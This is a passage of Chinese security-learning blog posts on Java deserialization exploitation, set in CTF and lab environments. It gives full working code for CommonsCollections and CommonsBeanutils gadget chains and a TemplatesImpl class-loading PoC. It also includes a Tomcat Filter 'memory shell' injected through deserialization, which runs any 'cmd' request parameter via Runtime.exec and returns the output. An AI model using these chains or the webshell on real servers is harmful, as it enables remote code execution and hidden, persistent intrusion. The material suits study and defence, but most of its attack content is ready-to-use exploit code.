Class.forName(&quot;org.apache.coyote.RequestGroupInfo&quot;).getDeclaredField(&quot;processors&quot;);            processorsField.setAccessible(true);            List&lt;RequestInfo&gt; requestInfoList = (List&lt;RequestInfo&gt;) processorsField.get(global);             //获取request和response            Field requestField = Class.forName(&quot;org.apache.coyote.RequestInfo&quot;).getDeclaredField(&quot;req&quot;);            requestField.setAccessible(true);            for (RequestInfo requestInfo : requestInfoList)&#123;                 //获取org.apache.coyote.Request                org.apache.coyote.Request request = (org.apache.coyote.Request) requestField.get(requestInfo);                 //通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request                org.apache.catalina.connector.Request http_request = (org.apache.catalina.connector.Request) request.getNote(1);                org.apache.catalina.connector.Response http_response = http_request.getResponse();                 PrintWriter writer = http_response.getWriter();                String cmd = http_request.getParameter(&quot;cmd&quot;);                 InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();                Scanner scanner = new Scanner(inputStream).useDelimiter(&quot;\\A&quot;);                String result = scanner.hasNext()?scanner.next():&quot;&quot;;                scanner.close();                writer.write(result);                writer.flush();                writer.close();            &#125;          &#125; catch (NoSuchFieldException e) &#123;            e.printStackTrace();        &#125; catch (ClassNotFoundException e) &#123;            e.printStackTrace();        &#125; catch (IllegalAccessException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;

反序列化注入内存马在CTF中，我们注入内存马的目的往往是为了获取不出网机器的回显，而内存马的注入往往是通过反序列化漏洞，下面就是一个例子
环境搭建下面我们先来搭建一个存在反序列化漏洞的环境，编写一个存在反序列化漏洞的Servlet。这里JDK版本为jdk8u_65
import javax.servlet.ServletException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.ByteArrayInputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.util.Base64;  @WebServlet(&quot;/unserial&quot;)public class Unserial_Servlet extends HttpServlet &#123;    @Override    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;        byte[] data = Base64.getDecoder().decode(req.getParameter(&quot;data&quot;));        ByteArrayInputStream inputStream = new ByteArrayInputStream(data);        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);        try &#123;            System.out.println(objectInputStream.readObject());        &#125; catch (ClassNotFoundException e) &#123;            e.printStackTrace();        &#125;    &#125;     @Override    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;        doPost(req,resp);    &#125;&#125;

依赖
&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;junit&lt;/groupId&gt;        &lt;artifactId&gt;junit&lt;/artifactId&gt;        &lt;version&gt;4.11&lt;/version&gt;        &lt;scope&gt;test&lt;/scope&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;commons-collections&lt;/groupId&gt;        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;        &lt;version&gt;3.2.1&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;javax.servlet&lt;/groupId&gt;        &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;        &lt;version&gt;4.0.1&lt;/version&gt;        &lt;scope&gt;compile&lt;/scope&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;javax.servlet.jsp&lt;/groupId&gt;        &lt;artifactId&gt;jsp-api&lt;/artifactId&gt;        &lt;version&gt;2.1&lt;/version&gt;        &lt;scope&gt;provided&lt;/scope&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;        &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;        &lt;version&gt;9.0.91&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;        &lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt;        &lt;version&gt;9.0.91&lt;/version&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;

去往&#x2F;unserial路由报500是正常的
我们看上面的Servlet代码可知就是一个正常的cc反序列化漏洞，所以这种解法这里就不展示了
那么当不出网的时候，我们就需要注入内存马了
任意类加载首先我们需要一个任意类加载的poc
package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import javax.xml.transform.Templates;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class Cc3 &#123;    public static void main(String[] args) throws Exception &#123;        TemplatesImpl templates = new TemplatesImpl();        Class tc = templates.getClass();        Field nameField = tc.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates, &quot;aaa&quot;);        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        byte[][] codes = &#123;code&#125;;        bytecodesField.set(templates, codes);        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);        tfactoryField.setAccessible(true);        tfactoryField.set(templates, new TransformerFactoryImpl());        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(TrAXFilter.class),                instantiateTransformer        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        instantiateTransformer.transform(TrAXFilter.class); //它的class类型可以序列化，该行代码运行可以弹出计算器        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();        map.put(&quot;value&quot;, &quot;b&quot;);        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, chainedTransformer);        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class);        ctor.setAccessible(true);        Object o = ctor.newInstance(Target.class, transformedMap);//        serialize(o);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;



注入内存马在前文Tomcat内存马部分，我们是通过执行JSP文件来写入内存马的。但是由于JSP内置了一些request对象，因此我们很容易获取当前线程的回显。如果我们通过反序列化漏洞注入内存马的话，就需要参考上文提到的回显方式手动获取request对象了。
这里我们构造的反序列化漏洞可以进行任意类加载，因此我们构造一个恶意类来注入内存马，这里我们以Filter型内存马为例。
获取Request对象我们首先通过上文的回显技术来获取当前线程的request对象，这里我以ThreadLocal方式为例，构造如下
package Tomcat_Echo_memShell; import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.apache.catalina.core.ApplicationFilterChain; import javax.servlet.ServletResponse;import java.io.PrintWriter;import java.lang.reflect.Field;import java.lang.reflect.Modifier; public class Tomcat_Echo_inject_ThreadLocal extends AbstractTranslet &#123;     static &#123;        try &#123;             //反射获取所需属性            java.lang.reflect.Field WRAP_SAME_OBJECT_FIELD = Class.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;).getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);            java.lang.reflect.Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedRequest&quot;);            java.lang.reflect.Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedResponse&quot;);             //使用modifiersField反射修改final型变量            java.lang.reflect.Field modifiersField = Field.class.getDeclaredField(&quot;modifiers&quot;);            modifiersField.setAccessible(true);            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);            WRAP_SAME_OBJECT_FIELD.setAccessible(true);            lastServicedRequestField.setAccessible(true);            lastServicedResponseField.setAccessible(true);             //将变量WRAP_SAME_OBJECT_FIELD设置为true，并初始化lastServicedRequest和lastServicedResponse变量            if (!WRAP_SAME_OBJECT_FIELD.getBoolean(null)) &#123;                WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);            &#125;             if (lastServicedRequestField.get(null) == null) &#123;                lastServicedRequestField.set(null, new ThreadLocal&lt;&gt;());            &#125;             if (lastServicedResponseField.get(null) == null) &#123;                lastServicedResponseField.set(null, new ThreadLocal&lt;&gt;());            &#125;              //获取response变量            if (lastServicedResponseField.get(null) != null) &#123;                ThreadLocal threadLocal = (ThreadLocal) lastServicedResponseField.get(null);                ServletResponse servletResponse = (ServletResponse) threadLocal.get();                PrintWriter writer = servletResponse.getWriter();                writer.write(&quot;Inject ThreadLocal Successfully!&quot;);                writer.flush();                writer.close();            &#125;        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;      @Override    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;     &#125;     @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;     &#125;&#125;

我们将这个恶意类发送过去之后，会初始化lastServicedRequest和lastServicedResponse属性为ThreadLocal类，下面我们就可以通过该类获取request对象了
注入Filter内存马下面我们依靠上文获取到的request对象进行后续注入工作
package Tomcat_Echo_memShell; import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.apache.catalina.core.ApplicationContext;import org.apache.catalina.core.ApplicationFilterChain;import org.apache.catalina.core.ApplicationFilterConfig;import org.apache.catalina.core.StandardContext;import org.apache.tomcat.util.descriptor.web.FilterDef;import org.apache.tomcat.util.descriptor.web.FilterMap; import javax.servlet.*;import java.io.IOException;import java.io.InputStream;import java.io.PrintWriter;import java.lang.reflect.InvocationTargetException; public class Tomcat_Echo_inject_Filter extends AbstractTranslet implements Filter &#123;     static &#123;        try &#123;            ServletContext servletContext = getServletContext();            java.lang.reflect.Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);            appContextField.setAccessible(true);            ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);            java.lang.reflect.Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);            standardContextField.setAccessible(true);            StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);              Tomcat_Echo_inject_Filter filter = new Tomcat_Echo_inject_Filter();            String name = &quot;ShellFilter&quot;;            FilterDef filterDef = new FilterDef();            filterDef.setFilter(filter);            filterDef.setFilterName(name);            filterDef.setFilterClass(filter.getClass().getName());            standardContext.addFilterDef(filterDef);              FilterMap filterMap = new FilterMap();            filterMap.addURLPattern(&quot;/*&quot;);            filterMap.setFilterName(name);            filterMap.setDispatcher(DispatcherType.REQUEST.name());            standardContext.addFilterMapBefore(filterMap);              java.lang.reflect.Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);            Configs.setAccessible(true);            java.util.Map filterConfigs = (java.util.Map) Configs.get(standardContext);             java.lang.reflect.Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(org.apache.catalina.Context.class, FilterDef.class);            constructor.setAccessible(true);            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);            filterConfigs.put(name, filterConfig);         &#125; catch (NoSuchFieldException e) &#123;            e.printStackTrace();        &#125; catch (ClassNotFoundException e) &#123;            e.printStackTrace();        &#125; catch (IllegalAccessException e) &#123;            e.printStackTrace();        &#125; catch (InvocationTargetException e) &#123;            e.printStackTrace();        &#125; catch (NoSuchMethodException e) &#123;            e.printStackTrace();        &#125; catch (InstantiationException e) &#123;            e.printStackTrace();        &#125;    &#125;      public static ServletContext getServletContext() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;        java.lang.reflect.Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedRequest&quot;);        lastServicedRequestField.setAccessible(true);        ThreadLocal threadLocal = (ThreadLocal) lastServicedRequestField.get(null);        if(threadLocal!=null &amp;&amp; threadLocal.get()!=null)&#123;            ServletRequest servletRequest = (ServletRequest) threadLocal.get();            return servletRequest.getServletContext();        &#125;        return null;    &#125;     @Override    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;     &#125;     @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;     &#125;     @Override    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123;        String cmd = request.getParameter(&quot;cmd&quot;);        response.setContentType(&quot;text/html; charset=UTF-8&quot;);        PrintWriter writer = response.getWriter();        if (cmd != null) &#123;            try &#123;                InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();                 //将命令执行结果写入扫描器并读取所有输入                java.util.Scanner scanner = new java.util.Scanner(in).useDelimiter(&quot;\\A&quot;);                String result = scanner.hasNext()?scanner.next():&quot;&quot;;                scanner.close();                writer.write(result);                writer.flush();                writer.close();            &#125; catch (IOException e) &#123;                e.printStackTrace();            &#125; catch (NullPointerException n) &#123;                n.printStackTrace();            &#125;        &#125;        chain.doFilter(request, response);    &#125;&#125;

示例这里我们仍以上文的漏洞环境为例，首先我们将Tomcat_Echo_inject_ThreadLocal类发送过去，初始化属性。

第一次请求时会报500，这是由于CC链本身的缘故。再一次发包，结果如下，说明此时我们能够从ThreadLocal对象中获取request了
接着我们再把filter内存马传进去
仍会报500，不过不要紧，此时我们的内存马已经注入进去了

结语内存马还是比较难懂，还是得多回来复习复习
参考Java安全学习——内存马
]]></content>
      <categories>
        <category>java内存马</category>
      </categories>
  </entry>
  <entry>
    <title>java反序列化之CommonsBeanutils</title>
    <url>/2024/11/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsBeanutils/</url>
    <content><![CDATA[引用Java反序列化之CommonsBeanutils
依赖导入首先我们先导入依赖
&lt;dependency&gt;    &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;    &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;    &lt;version&gt;1.9.3&lt;/version&gt;&lt;/dependency&gt;

BeanJava Bean是一种特定规范的类，使得开发中更加模块化，一个bean需要包括几种特点：

实现Serializable接口，使得类可序列化
无参构造函数，JavaBean应有一个公共的无参构造函数以便使用的时候快速实例化
私有属性，bean的属性一般被声明为private
公有getter和setter用于修改和读取私有属性

注意：getter和setter方法命名要规范
举个简单的例子：
publc class User() implements Serializable&#123;	private String name;    private int age;    public User()&#123;&#125;    public void setName(String name)&#123;this.name = name;&#125;    public void setAge(int age)&#123;this.age = age;&#125;    public String getName()&#123;return this.name;&#125;    public int getAge()&#123;return this.age;&#125;&#125;

PropertyUtils.getProperty()public static Object getProperty(final Object bean, final String name)        throws IllegalAccessException, InvocationTargetException,        NoSuchMethodException &#123;    return (PropertyUtilsBean.getInstance().getProperty(bean, name));&#125;

该方法传入两个参数，一个是实例化后的bean对象，另一个是字符串类型的属性名
我们继续跟进到PropertyUtilsBean中的getProperty方法，该方法首先检测bean对象中是否存在某个属性（property），存在的话调用其getter()，因此假如说某个getter中存在可利用点，调用该方法的时候即有利用的可能
下面演示一下
获取简单属性import org.apache.commons.beanutils.BeanUtils;public class SimplePropertyExample &#123;    public static void main(String[] args) &#123;        User user = new User();        user.setUsername(&quot;johndoe&quot;);        try &#123;            String username = BeanUtils.getProperty(user, &quot;username&quot;);            System.out.println(&quot;Username: &quot; + username); // 输出 &quot;Username: johndoe&quot;        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;

User类定义如下
package org.example;public class User &#123;    private String username;    public String getUsername() &#123;        return username;    &#125;    public void setUsername(String username) &#123;        this.username = username;    &#125;&#125;

获取嵌套属性import org.apache.commons.beanutils.BeanUtils;public class NestedPropertyExample &#123;    public static void main(String[] args) &#123;        Address address = new Address();        address.setCity(&quot;New York&quot;);                User user = new User();        user.setAddress(address);        try &#123;            String city = BeanUtils.getProperty(user, &quot;address.city&quot;);            System.out.println(&quot;City: &quot; + city); // 输出 &quot;City: New York&quot;        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;

User类定义如下
package org.example;public class User &#123;    private Address address;    public Address getAddress() &#123;        return address;    &#125;    public void setAddress(Address address) &#123;        this.address = address;    &#125;&#125;

Address类定义如下
package org.example;public class Address &#123;    private String city;    public String getCity() &#123;        return city;    &#125;    public void setCity(String city) &#123;        this.city = city;    &#125;&#125;

处理集合属性package org.example;import org.apache.commons.beanutils.BeanUtils;import java.util.ArrayList;import java.util.List;import org.apache.commons.beanutils.PropertyUtils;public class Cb &#123;    public static void main(String[] args) throws Exception &#123;        Group group = new Group();        List&lt;String&gt; members = new ArrayList&lt;&gt;();        members.add(&quot;Alice&quot;);        members.add(&quot;Bob&quot;);        group.setMembers(members);        try &#123;            // 使用 PropertyUtils.getProperty 获取真实的属性值            List&lt;String&gt; groupMembers = (List&lt;String&gt;) PropertyUtils.getProperty(group, &quot;members&quot;);            System.out.println(&quot;Group Members: &quot; + groupMembers); // 输出 &quot;Group Members: [Alice, Bob]&quot;        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;

Group类代码如下：
package org.example;import java.util.List;public class Group &#123;    private List&lt;String&gt; members;    public List&lt;String&gt; getMembers() &#123;        return members;    &#125;    public void setMembers(List&lt;String&gt; members) &#123;        this.members = members;    &#125;&#125;

TemplatesImpl.getOutputProperties()上面介绍过getProperty()方法能够调用一个getter，在TemplatesImpl中，有一个getter就是getOutputProperties()，通过getProperty()如果bean是一个TemplatesImpl对象，name的值为”outputProperties”，即可调用TemplatesImpl对象的getOutputProperties()方法。CC链的分析中，newTransformer()方法能够调用TransformersImpl的构造方法，在TransformersImpl的构造方法中调用了getTransletInstance()方法，进而走到defineClass()-&gt;newInstance()的攻击链
public synchronized Properties getOutputProperties() &#123;    try &#123;        return newTransformer().getOutputProperties();    &#125;    catch (TransformerConfigurationException e) &#123;        return null;    &#125;&#125;

BeanComparator.compare()在BeanComparator的compare()方法中，存在对getProperty()方法的调用，并且参数可控
public int compare( final T o1, final T o2 ) &#123;    if ( property == null ) &#123;        // compare the actual objects        return internalCompare( o1, o2 );    &#125;    try &#123;        final Object value1 = PropertyUtils.getProperty( o1, property );        final Object value2 = PropertyUtils.getProperty( o2, property );        return internalCompare( value1, value2 );    &#125;......&#125;

在前面的CC链的分析中，能发现有一处走到compare()方法的调用，即利用优先队列的，因此CB的利用已经初具雏形了

gadget链构造我们先尝试正向构造链
package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.BeanComparator;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;public class Cb &#123;    public static void main(String[] args) throws Exception &#123;        TemplatesImpl templates = new TemplatesImpl();        Class tc = templates.getClass();        Field nameField = tc.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates, &quot;aaa&quot;);        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        byte[][] codes = &#123;code&#125;;        bytecodesField.set(templates, codes);        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);        tfactoryField.setAccessible(true);        tfactoryField.set(templates, new TransformerFactoryImpl());        BeanComparator&lt;Object&gt; beanComparator = new BeanComparator&lt;&gt;();        beanComparator.setProperty(&quot;outputProperties&quot;);        beanComparator.compare(templates,null);    &#125;&#125;

运行后会成功弹出计算器
上述代码怎么运行的建议自己调试跟着走一遍理解会更深刻
然后我们补上优先队列构成完整的利用链
package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.BeanComparator;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class Cb &#123;    public static void main(String[] args) throws Exception &#123;        TemplatesImpl templates = new TemplatesImpl();        Class tc = templates.getClass();        Field nameField = tc.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates, &quot;aaa&quot;);        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        byte[][] codes = &#123;code&#125;;        bytecodesField.set(templates, codes);        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);        tfactoryField.setAccessible(true);        tfactoryField.set(templates, new TransformerFactoryImpl());        BeanComparator&lt;Object&gt; beanComparator = new BeanComparator&lt;&gt;();        beanComparator.setProperty(&quot;outputProperties&quot;);//        beanComparator.compare(templates,null);        PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(beanComparator);        Class c1 = priorityQueue.getClass();        Field queueField = c1.getDeclaredField(&quot;queue&quot;);        queueField.setAccessible(true);        queueField.set(priorityQueue,new Object[]&#123;templates,templates,templates&#125;);        Field sizeField = c1.getDeclaredField(&quot;size&quot;);        sizeField.setAccessible(true);        sizeField.set(priorityQueue,3);//        serialize(priorityQueue);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;

]]></content>
      <categories>
        <category>java反序列化</category>
      </categories>
  </entry>
  <entry>
    <title>java反序列化CommonsCollections</title>
    <url>/2024/10/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections/</url>
    <content><![CDATA[前言Commons Collections &lt;= 3.2.1jdk &lt;= 8u65

CC1危险的方法调用：Transform.transform()
Transformer接口，该接口主要就是定义了一个接口方法transform()

ConstantTransformer类：ConstantTransformer类中的transform()方法：
返回一个常量，该常量在构造方法调用的时候就确定了，因此，后续不管transform()方法传入什么对象，都将返回构造对象时构造方法传入的那个对象

InvokerTransformer我们可以查看实现这个接口的类（idea中选中接口名+ctrl+h）
然后在其中有一个实现类为InvokerTransformer.java，其中的transform方法如下

可以发现该方法接受任意一个对象实例，进行反射调用执行任意方法
所以让我们来测试一下，我们先看一下InvokerTransformer类的构造函数：接收参数名，参数类型，参数值

测试代码如下，成功弹出计算器

ChainedTransformer类：该类的transform()方法实现了对实现Transformer接口的对象的transform()方法的链式调用，上一个transform()调用的输出作为下一个transform()调用的输入：

iTransformers数组是在构造函数中赋值的，是一个Transformer对象数组

再结合一下上面的InvokerTransformer以及ConstantTransformer，由于不管传入什么ConstantTransformer都返回新建对象时构造函数传入的那个对象，因此这里在调用chainedTransformer的transform()方法时随便传了个整型对象666进去，也成功出现弹窗：
package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;public class Test &#123;    public static void main(String[] args) throws  Exception&#123;        //new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(Runtime.getRuntime());        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.getRuntime()),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        chainedTransformer.transform(666);    &#125;&#125;

构造完整链那么接下来我们就要找哪里会调用Transform方法，就比如类TransformedMap中的checkSetValue方法调用了transform方法

然后我们就要看看参数valueTransformer，去查看该类的构造函数

该构造函数接受一个Map，然后对key和value进行操作
但是一个protected方法，说明是被自己调用的，我们继续查找

一个静态的方法调用了该构造函数，对传进来的参数进行了装饰的作用（好像没啥用）
因为我们是要调用该类中的checkSetValue方法，所以我们要查查它的用途，发现只有一个用法

进入类中查看方法，setValue方法简单理解就是要对传入的键值对中的值进行修改，这里的方法接受的参数为Object

因此我们就需要一个Map类，我们是要对valueTransformer参数进行操作，所以keyTransformer参数值可以设为NULL，因此链可以构造如下：
package org.example;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        Runtime r = Runtime.getRuntime();        InvokerTransformer invokerTransformer =                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();        map.put(&quot;a&quot;, &quot;b&quot;);		// 装饰 HashMap，使其在设置值时执行 transform()        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, invokerTransformer);        for (Map.Entry entry : transformedMap.entrySet()) &#123;            // 这里会触发 invokerTransformer 的 transform()，调用 Runtime.exec(&quot;calc&quot;)            entry.setValue(r);        &#125;    &#125;&#125;

到现在我们已经完成一半了，上面说明了我们只要找到一个Map.Entry遍历数组并且调用了setValue方法，那么我们就可以把transformedMap传进去，实现弹窗（当然setValue的值要可控）
因此现在我们要找不同名的调用setValue方法的函数，最好的就是找readObject里面调用该方法的
最终我们找到了，在AnnotationInvocationHandler.java中


观察下该类中有什么可控的，看看构造函数，可以发现memberValues是完全可控的，我们可以把transformedMap传进去

第一个参数type是继承了Annotation（注解）的Class对象，但是无碍
需要注意的是该类不是public，而是默认的，也就是只能够在自己那个包里面获取的，所以我们需要反射调用

初步的代码如下：
package org.example;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        Runtime r = Runtime.getRuntime();        InvokerTransformer invokerTransformer =                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();        map.put(&quot;a&quot;, &quot;b&quot;);        // 装饰 HashMap，使其在设置值时执行 transform()        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, invokerTransformer);        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class);        ctor.setAccessible(true);        Object o = ctor.newInstance(Override.class, transformedMap);        serialize(o);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;

但是有几个问题我们需要解决，先解决第一个问题：Runtime类不能够被序列化，因为它没有继承相关的Serializable类,所以我们需要反射调用
Class c = Runtime.class;Method getRuntimeMethod = c.getMethod(&quot;getRuntime&quot;,null);Runtime r = (Runtime)getRuntimeMethod.invoke(null,null);Method execMethod = c.getMethod(&quot;exec&quot;,String.class);execMethod.invoke(r,&quot;calc&quot;);

上面是普通的反射调用，我们需要将其改为InvokerTransformer形的
Method getRuntimeMethod = (Method)new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);//获得getRuntime方法Runtime r = (Runtime)new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);//获得Runtime对象new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);//弹计算器

这样就已经将其改成可以序列化的版本了，这时候可以发现上面相当于是transform方法的循环调用，所以联想到了ChainedTransformer
